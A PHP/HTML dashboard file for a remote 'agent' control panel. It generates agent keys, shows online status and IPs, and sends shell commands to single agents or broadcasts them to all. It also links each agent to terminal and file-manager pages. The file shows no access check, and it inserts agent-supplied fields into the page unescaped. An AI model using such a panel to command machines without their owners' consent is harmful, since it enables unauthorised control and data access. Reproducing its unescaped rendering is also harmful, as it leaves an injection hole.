<?php
// udp_dashboard.php - Complete dashboard with agent key generation
?>
<!DOCTYPE html>
<html>
<head>
    <title>UDP Webhook Dashboard</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #0a0e12;
            color: #e1e4e8;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            padding: 20px;
        }
        
        .container {
            max-width: 1600px;
            margin: 0 auto;
        }
        
        /* Header */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 15px;
            border-bottom: 2px solid #30363d;
        }
        
        h1 {
            color: #58a6ff;
            font-size: 28px;
            font-weight: 600;
        }
        
        h1 span {
            color: #3fb950;
            font-size: 14px;
            background: #23863620;
            padding: 4px 8px;
            border-radius: 20px;
            margin-left: 10px;
        }
        
        .header-actions {
            display: flex;
            gap: 10px;
        }
        
        /* Stats Cards */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 12px;
            padding: 20px;
            transition: transform 0.2s;
        }
        
        .stat-card:hover {
            transform: translateY(-2px);
            border-color: #58a6ff;
        }
        
        .stat-label {
            color: #8b949e;
            font-size: 14px;
            margin-bottom: 8px;
        }
        
        .stat-value {
            font-size: 36px;
            font-weight: 700;
            color: #58a6ff;
        }
        
        .stat-value.online {
            color: #3fb950;
        }
        
        .stat-value.offline {
            color: #f85149;
        }
        
        /* Action Cards */
        .action-grid {
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .action-card {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 12px;
            padding: 20px;
        }
        
        .action-card h2 {
            color: #58a6ff;
            font-size: 18px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .input-group {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        .input-group input, .input-group select {
            flex: 1;
            background: #0d1117;
            border: 1px solid #30363d;
            color: #e1e4e8;
            padding: 12px 15px;
            border-radius: 8px;
            font-size: 14px;
            min-width: 200px;
        }
        
        .input-group input:focus, .input-group select:focus {
            outline: none;
            border-color: #58a6ff;
        }
        
        .btn {
            background: #238636;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        
        .btn:hover {
            background: #2ea043;
            transform: translateY(-1px);
        }
        
        .btn.primary {
            background: #1f6feb;
        }
        
        .btn.primary:hover {
            background: #388bfd;
        }
        
        .btn.secondary {
            background: #21262d;
        }
        
        .btn.secondary:hover {
            background: #30363d;
        }
        
        .btn.danger {
            background: #da3633;
        }
        
        .btn.danger:hover {
            background: #f85149;
        }
        
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        
        /* Generate Key Form */
        .generate-key-form {
            display: flex;
            gap: 10px;
            align-items: flex-end;
            flex-wrap: wrap;
        }
        
        .form-field {
            flex: 1;
            min-width: 200px;
        }
        
        .form-field label {
            display: block;
            color: #8b949e;
            font-size: 12px;
            margin-bottom: 5px;
        }
        
        .form-field input {
            width: 100%;
            background: #0d1117;
            border: 1px solid #30363d;
            color: #e1e4e8;
            padding: 10px 12px;
            border-radius: 6px;
            font-size: 14px;
        }
        
        /* Key Display */
        .key-display {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 8px;
            padding: 15px;
            margin-top: 15px;
            display: none;
        }
        
        .key-display.show {
            display: block;
            animation: slideDown 0.3s;
        }
        
        @keyframes slideDown {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .key-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .key-header h3 {
            color: #3fb950;
            font-size: 16px;
        }
        
        .key-box {
            background: #000;
            border: 1px solid #3fb950;
            border-radius: 6px;
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            color: #3fb950;
            word-break: break-all;
            margin: 10px 0;
        }
        
        .key-actions {
            display: flex;
            gap: 10px;
            justify-content: flex-end;
        }
        
        /* Agents Section */
        .agents-section {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 16px;
            padding: 24px;
        }
        
        .section-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
            padding-bottom: 16px;
            border-bottom: 1px solid #21262d;
        }
        
        .section-header h2 {
            color: #e1e4e8;
            font-size: 20px;
            font-weight: 700;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .section-header h2 .count-badge {
            background: #1f6feb;
            color: #fff;
            font-size: 12px;
            padding: 2px 10px;
            border-radius: 20px;
            font-weight: 600;
        }
        
        .view-toggle {
            display: flex;
            background: #0d1117;
            border-radius: 8px;
            border: 1px solid #30363d;
            overflow: hidden;
        }
        
        .view-toggle button {
            background: none;
            border: none;
            color: #8b949e;
            padding: 6px 14px;
            cursor: pointer;
            font-size: 13px;
            transition: all 0.2s;
        }
        
        .view-toggle button.active {
            background: #21262d;
            color: #e1e4e8;
        }
        
        .agents-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
            gap: 16px;
        }
        
        .agents-grid.list-view {
            grid-template-columns: 1fr;
        }
        
        /* Agent Card */
        .agent-card {
            background: #0d1117;
            border: 1px solid #21262d;
            border-radius: 12px;
            padding: 0;
            transition: all 0.25s ease;
            overflow: hidden;
            position: relative;
        }
        
        .agent-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, #30363d, #30363d);
            transition: background 0.3s;
        }
        
        .agent-card.online::before {
            background: linear-gradient(90deg, #238636, #3fb950, #56d364);
        }
        
        .agent-card.offline::before {
            background: linear-gradient(90deg, #da3633, #f85149);
        }
        
        .agent-card:hover {
            border-color: #388bfd40;
            transform: translateY(-3px);
            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
        }
        
        .agent-card-body {
            padding: 18px;
        }
        
        /* Agent Header */
        .agent-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            margin-bottom: 14px;
        }
        
        .agent-identity {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .agent-avatar {
            width: 40px;
            height: 40px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            font-weight: 700;
            flex-shrink: 0;
        }
        
        .agent-avatar.online {
            background: linear-gradient(135deg, #23863620, #238636);
            color: #3fb950;
            border: 1px solid #23863640;
        }
        
        .agent-avatar.offline {
            background: linear-gradient(135deg, #21262d, #30363d);
            color: #8b949e;
            border: 1px solid #30363d;
        }
        
        .agent-name-group {
            display: flex;
            flex-direction: column;
            gap: 2px;
        }
        
        .agent-name {
            font-size: 15px;
            font-weight: 600;
            color: #e1e4e8;
            line-height: 1.2;
        }
        
        .agent-ip {
            font-size: 11px;
            color: #8b949e;
            font-family: 'Courier New', monospace;
        }
        
        /* Status Badge */
        .agent-status {
            display: flex;
            align-items: center;
            gap: 6px;
            padding: 4px 10px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
            letter-spacing: 0.5px;
        }
        
        .agent-status .pulse {
            width: 7px;
            height: 7px;
            border-radius: 50%;
            display: inline-block;
        }
        
        .agent-status.online {
            background: #23863615;
            color: #3fb950;
        }
        
        .agent-status.online .pulse {
            background: #3fb950;
            box-shadow: 0 0 0 0 rgba(63, 185, 80, 0.6);
            animation: pulse-green 2s infinite;
        }
        
        .agent-status.offline {
            background: #f8514915;
            color: #f85149;
        }
        
        .agent-status.offline .pulse {
            background: #f85149;
        }
        
        @keyframes pulse-green {
            0% { box-shadow: 0 0 0 0 rgba(63, 185, 80, 0.5); }
            70% { box-shadow: 0 0 0 6px rgba(63, 185, 80, 0); }
            100% { box-shadow: 0 0 0 0 rgba(63, 185, 80, 0); }
        }
        
        /* Info Grid */
        .agent-info {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 8px;
            margin-bottom: 14px;
        }
        
        .info-item {
            background: #161b22;
            border-radius: 8px;
            padding: 8px 10px;
        }
        
        .info-item .info-label {
            font-size: 10px;
            color: #6e7681;
            text-transform: uppercase;
            letter-spacing: 0.8px;
            margin-bottom: 2px;
        }
        
        .info-item .info-value {
            font-size: 12px;
            color: #e1e4e8;
            font-family: 'Courier New', monospace;
            word-break: break-all;
        }
        
        .info-item.full-width {
            grid-column: 1 / -1;
        }
        
        /* Command Input */
        .cmd-section {
            margin: 14px 0;
        }
        
        .cmd-section label {
            font-size: 10px;
            color: #6e7681;
            text-transform: uppercase;
            letter-spacing: 0.8px;
            margin-bottom: 6px;
            display: block;
        }
        
        .cmd-input {
            display: flex;
            gap: 0;
            border-radius: 8px;
            overflow: hidden;
            border: 1px solid #30363d;
            transition: border-color 0.2s;
        }
        
        .cmd-input:focus-within {
            border-color: #388bfd;
        }
        
        .cmd-input input {
            flex: 1;
            background: #0d1117;
            border: none;
            color: #7ee787;
            padding: 10px 12px;
            font-size: 13px;
            font-family: 'Courier New', monospace;
        }
        
        .cmd-input input::placeholder {
            color: #30363d;
        }
        
        .cmd-input input:focus {
            outline: none;
        }
        
        .cmd-input button {
            background: #238636;
            color: white;
            border: none;
            padding: 10px 18px;
            cursor: pointer;
            font-size: 13px;
            font-weight: 600;
            transition: background 0.2s;
            display: flex;
            align-items: center;
            gap: 4px;
        }
        
        .cmd-input button:hover {
            background: #2ea043;
        }
        
        /* Results Preview */
        .results-preview {
            background: #0d1117;
            border: 1px solid #21262d;
            border-radius: 8px;
            padding: 10px 12px;
            margin-top: 10px;
            max-height: 90px;
            overflow-y: auto;
            font-size: 12px;
            font-family: 'Courier New', monospace;
            color: #7ee787;
            line-height: 1.5;
        }
        
        .results-preview::-webkit-scrollbar {
            width: 4px;
        }
        
        .results-preview::-webkit-scrollbar-track {
            background: transparent;
        }
        
        .results-preview::-webkit-scrollbar-thumb {
            background: #30363d;
            border-radius: 4px;
        }
        
        .results-preview .result-cmd {
            color: #58a6ff;
            margin-bottom: 4px;
        }
        
        .results-preview .result-output {
            color: #7ee787;
        }
        
        .results-preview .result-time {
            color: #484f58;
            font-size: 10px;
            margin-top: 4px;
        }
        
        .results-preview .no-results {
            color: #484f58;
            font-style: italic;
        }
        
        /* Agent Actions Bar */
        .agent-actions {
            display: flex;
            gap: 6px;
            margin-top: 14px;
            padding-top: 14px;
            border-top: 1px solid #21262d;
        }
        
        .agent-actions button {
            flex: 1;
            padding: 8px 6px;
            font-size: 11px;
            font-weight: 600;
            border: 1px solid #30363d;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.15s;
            background: #161b22;
            color: #8b949e;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 4px;
        }
        
        .agent-actions button:hover {
            background: #21262d;
            color: #e1e4e8;
            border-color: #484f58;
        }
        
        .agent-actions button.act-terminal {
            background: #1f6feb20;
            color: #58a6ff;
            border-color: #1f6feb40;
        }
        
        .agent-actions button.act-terminal:hover {
            background: #1f6feb40;
        }
        
        .agent-actions button.act-delete {
            color: #f85149;
            border-color: #f8514930;
        }
        
        .agent-actions button.act-delete:hover {
            background: #f8514920;
            border-color: #f85149;
        }
        
        /* Empty State */
        .empty-state {
            grid-column: 1 / -1;
            text-align: center;
            padding: 80px 40px;
        }
        
        .empty-state .empty-icon {
            font-size: 56px;
            margin-bottom: 20px;
            opacity: 0.5;
        }
        
        .empty-state h3 {
            color: #e1e4e8;
            font-size: 18px;
            margin-bottom: 8px;
        }
        
        .empty-state p {
            color: #8b949e;
            font-size: 14px;
        }
        
        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #238636;
            color: white;
            padding: 12px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
            z-index: 1000;
            display: none;
            animation: slideIn 0.3s;
        }
        
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        .loading {
            text-align: center;
            padding: 40px;
            color: #8b949e;
        }
        
        .spinner {
            border: 3px solid #30363d;
            border-top: 3px solid #58a6ff;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <h1>
                🚀 UDP Webhook Dashboard
                <span>v2.0</span>
            </h1>
            <div class="header-actions">
                <button class="btn secondary" onclick="location.reload()">
                    ↻ Refresh
                </button>
            </div>
        </div>
        
        <!-- Stats Cards -->
        <div class="stats-grid" id="stats">
            <div class="stat-card">
                <div class="stat-label">Total Agents</div>
                <div class="stat-value" id="totalAgents">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Online</div>
                <div class="stat-value online" id="onlineAgents">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Offline</div>
                <div class="stat-value offline" id="offlineAgents">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Last Update</div>
                <div class="stat-value" style="font-size: 20px;" id="lastUpdate">-</div>
            </div>
        </div>
        
        <!-- Action Grid -->
        <div class="action-grid">
            <!-- Generate Agent Key Card -->
            <div class="action-card">
                <h2>🔑 Generate New Agent Key</h2>
                <div class="generate-key-form">
                    <div class="form-field">
                        <label>Agent Name</label>
                        <input type="text" id="agentName" placeholder="e.g., Windows-10, Ubuntu-Server" value="New Agent">
                    </div>
                    <button class="btn primary" onclick="generateAgentKey()">
                        ✨ Generate Key
                    </button>
                </div>
                
                <!-- Generated Key Display -->
                <div class="key-display" id="keyDisplay">
                    <div class="key-header">
                        <h3>✅ New Agent Key Generated</h3>
                        <button class="btn secondary" style="padding: 4px 8px;" onclick="copyToClipboard()">Copy</button>
                    </div>
                    <div class="key-box" id="agentKeyValue"></div>
                    <div class="key-actions">
                        <button class="btn secondary" onclick="hideKeyDisplay()">Close</button>
                        <button class="btn" onclick="useGeneratedKey()">Use This Agent</button>
                    </div>
                </div>
            </div>
            
            <!-- Broadcast Command Card -->
            <div class="action-card">
                <h2>📢 Broadcast Command</h2>
                <div class="input-group">
                    <input type="text" id="broadcastCommand" placeholder="Enter command for ALL agents">
                    <button class="btn" onclick="broadcastCommand()">Send to All</button>
                </div>
            </div>
        </div>
        
        <!-- Agents List -->
        <div class="agents-section">
            <div class="section-header">
                <h2>
                    Connected Agents
                    <span class="count-badge" id="agentCount">0</span>
                </h2>
                <div class="view-toggle">
                    <button class="active" onclick="setView('grid', this)">Grid</button>
                    <button onclick="setView('list', this)">List</button>
                </div>
            </div>
            
            <div id="agentsGrid" class="agents-grid">
                <div class="loading">
                    <div class="spinner"></div>
                    Loading agents...
                </div>
            </div>
        </div>
    </div>
    
    <!-- Toast Notification -->
    <div class="toast" id="toast"></div>

    <script>
        // Configuration
        const API_URL = 'udp_api.php';
        let agents = [];
        let generatedKey = '';
        
        // Show toast message
        function showToast(message, type = 'success') {
            const toast = document.getElementById('toast');
            toast.style.display = 'block';
            toast.style.background = type === 'success' ? '#238636' : '#da3633';
            toast.textContent = message;
            
            setTimeout(() => {
                toast.style.display = 'none';
            }, 3000);
        }
        
        // Hide key display
        function hideKeyDisplay() {
            document.getElementById('keyDisplay').classList.remove('show');
        }
        
        // Copy to clipboard
        function copyToClipboard() {
            const key = document.getElementById('agentKeyValue').textContent;
            navigator.clipboard.writeText(key).then(() => {
                showToast('✅ Agent key copied to clipboard!');
            });
        }
        
        // Use generated key
        function useGeneratedKey() {
            if (generatedKey) {
                // Scroll to the agent card
                const agentCard = document.getElementById(`agent-${generatedKey}`);
                if (agentCard) {
                    agentCard.scrollIntoView({ behavior: 'smooth' });
                    agentCard.style.backgroundColor = '#23863620';
                    setTimeout(() => {
                        agentCard.style.backgroundColor = '';
                    }, 2000);
                }
            }
            hideKeyDisplay();
        }
        
        // Generate new agent key
        function generateAgentKey() {
            const agentName = document.getElementById('agentName').value.trim() || 'New Agent';
            
            // Disable button during generation
            const btn = event.target;
            const originalText = btn.innerHTML;
            btn.innerHTML = '<span class="spinner" style="width: 16px; height: 16px; margin: 0;"></span> Generating...';
            btn.disabled = true;
            
            const formData = new FormData();
            formData.append('action', 'generate_key');
            formData.append('name', agentName);
            
            fetch(API_URL, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    generatedKey = data.secret_key;
                    
                    // Show the generated key
                    document.getElementById('agentKeyValue').textContent = data.secret_key;
                    document.getElementById('keyDisplay').classList.add('show');
                    
                    showToast(`✅ New agent "${agentName}" created!`);
                    
                    // Reload agents list
                    loadAgents();
                } else {
                    showToast('❌ Failed to generate key: ' + (data.error || 'Unknown error'), 'error');
                }
            })
            .catch(error => {
                showToast('❌ Error: ' + error.message, 'error');
            })
            .finally(() => {
                btn.innerHTML = originalText;
                btn.disabled = false;
            });
        }
        
        // Load agents
        function loadAgents() {
            fetch(`${API_URL}?action=list_agents`)
                .then(response => response.json())
                .then(data => {
                    agents = data;
                    displayAgents();
                    updateStats();
                })
                .catch(error => {
                    console.error('Error loading agents:', error);
                    document.getElementById('agentsGrid').innerHTML = `
                        <div style="grid-column: 1/-1; text-align: center; padding: 40px; color: #f85149;">
                            ❌ Failed to load agents: ${error.message}
                        </div>
                    `;
                });
        }
        
        // View toggle
        function setView(mode, btn) {
            const grid = document.getElementById('agentsGrid');
            grid.classList.toggle('list-view', mode === 'list');
            document.querySelectorAll('.view-toggle button').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
        }
        
        // Display agents
        function displayAgents() {
            const grid = document.getElementById('agentsGrid');
            
            if (!agents || agents.length === 0) {
                grid.innerHTML = `
                    <div class="empty-state">
                        <div class="empty-icon">📡</div>
                        <h3>No agents connected</h3>
                        <p>Generate an agent key above to get started</p>
                    </div>
                `;
                return;
            }
            
            let html = '';
            
            agents.forEach(agent => {
                const online = agent.online ? 'online' : 'offline';
                const statusLabel = agent.online ? 'ONLINE' : 'OFFLINE';
                const agentId = agent.id || agent.secret_key;
                const shortId = agentId.substring(0, 8);
                const initial = (agent.name || shortId).charAt(0).toUpperCase();
                const lastSeen = agent.last_seen ? new Date(agent.last_seen + ' UTC').toLocaleString() : 'Never';
                const created = agent.created || 'Unknown';
                
                html += `
                    <div class="agent-card ${online}" id="agent-${agentId}">
                        <div class="agent-card-body">
                            <div class="agent-header">
                                <div class="agent-identity">
                                    <div class="agent-avatar ${online}">${initial}</div>
                                    <div class="agent-name-group">
                                        <span class="agent-name">${escapeHtml(agent.name || shortId)}</span>
                                        <span class="agent-ip">${agent.ip || 'Unknown'}</span>
                                    </div>
                                </div>
                                <span class="agent-status ${online}">
                                    <span class="pulse"></span>
                                    ${statusLabel}
                                </span>
                            </div>
                            
                            <div class="agent-info">
                                <div class="info-item full-width">
                                    <div class="info-label">Agent Key</div>
                                    <div class="info-value">${agentId}</div>
                                </div>
                                <div class="info-item">
                                    <div class="info-label">Last Seen</div>
                                    <div class="info-value">${lastSeen}</div>
                                </div>
                                <div class="info-item">
                                    <div class="info-label">Created</div>
                                    <div class="info-value">${created}</div>
                                </div>
                            </div>
                            
                            <div class="cmd-section">
                                <label>Execute Command</label>
                                <div class="cmd-input">
                                    <input type="text" id="cmd-${agentId}" placeholder="$ enter command..." onkeypress="handleKeyPress(event, '${agentId}')">
                                    <button onclick="sendCommand('${agentId}')">Run ⏎</button>
                                </div>
                            </div>
                            
                            <div class="results-preview" id="results-${agentId}">
                                <span class="no-results">Waiting for results...</span>
                            </div>
                            
                            <div class="agent-actions">
                                <button onclick="renameAgent('${agentId}')">✏️ Rename</button>
                                <button onclick="copyAgentKey('${agentId}')">📋 Copy</button>
                                <button class="act-terminal" onclick="window.open('terminal.php?agent=${agentId}', '_blank')">🖥️ Terminal</button>
                                <button class="act-terminal" onclick="window.open('fileman.php?agent=${agentId}', '_blank')">📁 Files</button>
                                <button class="act-delete" onclick="deleteAgent('${agentId}')">🗑️</button>
                            </div>
                        </div>
                    </div>
                `;
            });
            
            grid.innerHTML = html;
            
            // Load results for each agent
            agents.forEach(agent => {
                const agentId = agent.id || agent.secret_key;
                loadResults(agentId);
            });
        }
        
        // Update statistics
        function updateStats() {
            const total = agents.length;
            const online = agents.filter(a => a.online).length;
            const offline = total - online;
            
            document.getElementById('totalAgents').textContent = total;
            document.getElementById('onlineAgents').textContent = online;
            document.getElementById('offlineAgents').textContent = offline;
            document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString();
            document.getElementById('agentCount').textContent = `${total}`;
        }
        
        // Load results for agent
        function loadResults(agentId) {
            fetch(`${API_URL}?action=get_results&agent_id=${encodeURIComponent(agentId)}`)
                .then(response => response.json())
                .then(results => {
                    const container = document.getElementById(`results-${agentId}`);
                    
                    if (container) {
                        if (results && results.length > 0) {
                            const lastResult = results[results.length - 1];
                            const output = escapeHtml(lastResult.output.substring(0, 150));
                            container.innerHTML = `
                                <div class="result-cmd">$ ${escapeHtml(lastResult.command)}</div>
                                <div class="result-output">${output}${lastResult.output.length > 150 ? '...' : ''}</div>
                                <div class="result-time">${lastResult.timestamp}</div>
                            `;
                        } else {
                            container.innerHTML = '<span class="no-results">No results yet</span>';
                        }
                    }
                })
                .catch(() => {});
        }
        
        // Send command to agent
        function sendCommand(agentId) {
            const input = document.getElementById(`cmd-${agentId}`);
            const command = input.value.trim();
            
            if (!command) {
                showToast('Please enter a command', 'error');
                return;
            }
            
            const formData = new FormData();
            formData.append('action', 'send_command');
            formData.append('agent_id', agentId);
            formData.append('command', command);
            
            fetch(API_URL, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showToast(`✅ Command sent to ${agentId.substring(0, 8)}...`);
                    input.value = '';
                    setTimeout(() => loadResults(agentId), 2000);
                } else {
                    showToast('❌ ' + (data.error || 'Failed to send command'), 'error');
                }
            })
            .catch(error => {
                showToast('❌ Error: ' + error.message, 'error');
            });
        }
        
        // Broadcast command
        function broadcastCommand() {
            const input = document.getElementById('broadcastCommand');
            const command = input.value.trim();
            
            if (!command) {
                showToast('Please enter a command', 'error');
                return;
            }
            
            const formData = new FormData();
            formData.append('action', 'broadcast');
            formData.append('command', command);
            
            fetch(API_URL, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showToast(`✅ ${data.message}`);
                    input.value = '';
                } else {
                    showToast('❌ ' + (data.error || 'Failed to broadcast'), 'error');
                }
            })
            .catch(error => {
                showToast('❌ Error: ' + error.message, 'error');
            });
        }
        
        // Copy agent key
        function copyAgentKey(agentId) {
            navigator.clipboard.writeText(agentId).then(() => {
                showToast('✅ Agent key copied to clipboard!');
            });
        }
        
        // Rename agent
        function renameAgent(agentId) {
            const newName = prompt('Enter new name for agent:', '');
            if (!newName) return;
            
            const formData = new FormData();
            formData.append('action', 'rename_agent');
            formData.append('agent_id', agentId);
            formData.append('name', newName);
            
            fetch(API_URL, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showToast('✅ Agent renamed successfully');
                    loadAgents();
                } else {
                    showToast('❌ Failed to rename agent', 'error');
                }
            });
        }
        
        // Delete agent
        function deleteAgent(agentId) {
            if (!confirm(`Are you sure you want to delete agent ${agentId.substring(0, 8)}...?`)) {
                return;
            }
            
            const formData = new FormData();
            formData.append('action', 'delete_agent');
            formData.append('agent_id', agentId);
            
            fetch(API_URL, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showToast('✅ Agent deleted');
                    loadAgents();
                } else {
                    showToast('❌ Failed to delete agent', 'error');
                }
            });
        }
        
        // Handle enter key
        function handleKeyPress(event, agentId) {
            if (event.key === 'Enter') {
                sendCommand(agentId);
            }
        }
        
        // Escape HTML
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        // Auto refresh every 5 seconds
        loadAgents();
        setInterval(loadAgents, 5000);
    </script>
</body>
</html>